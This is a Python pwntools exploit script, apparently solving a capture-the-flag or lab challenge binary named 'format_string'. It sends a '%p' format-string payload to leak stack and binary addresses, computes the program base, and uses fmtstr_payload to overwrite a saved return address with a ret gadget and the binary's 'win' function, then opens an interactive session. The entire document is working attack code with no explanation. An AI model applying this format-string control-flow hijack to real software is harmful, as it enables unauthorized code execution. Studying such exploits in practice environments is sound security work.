#!/usr/bin/python3
from pwn import *
PATH = './format_string'
ADDR = '127.0.0.1'
PORT = 9005
elf = context.binary = ELF(PATH)
context.log_level = 'info'
gs = '''
b* main+140
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(ADDR,PORT)
    elif args.GDBWIN:
        context.terminal = ['wt.exe','wsl.exe','script', '-q', 'gdb_sess', '-c']
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
io = start()
######################
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
payload_leak = b'AAAA' + b'%p.'*50
io.sendlineafter(b'Enter some text: ', payload_leak)
leak = io.recvline().decode().strip().split('.')
for i in range(len(leak)):
    log.info(f'leak[{i}]: {leak[i]}')
log.info(f'libc address: {hex(libc.address)}')
stack_address = int(leak[32],16)
log.info(f'stack address: {hex(stack_address)}')
target_address = stack_address - 0x471
log.info(f'target address: {hex(target_address)}')
elf.address = int(leak[29],16) - 0x40
log.info(f'elf address: {hex(elf.address)}')
log.info(f'win address: {hex(elf.symbols.win)}')
offset = 8

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f'ret gadget: {hex(ret_gadget)}')

stack_ref = int(leak[46], 16)
log.info(f'stack reference (leak[46]): {hex(stack_ref)}')

ret_addr_location = stack_ref - 0x110
log.info(f'return address location: {hex(ret_addr_location)}')

payload = fmtstr_payload(offset, {
    ret_addr_location: ret_gadget,
    ret_addr_location + 8: elf.symbols.win
}, write_size='short')
# #payload = b'a'
io.sendlineafter(b'Enter some text: ', payload)

io.interactive()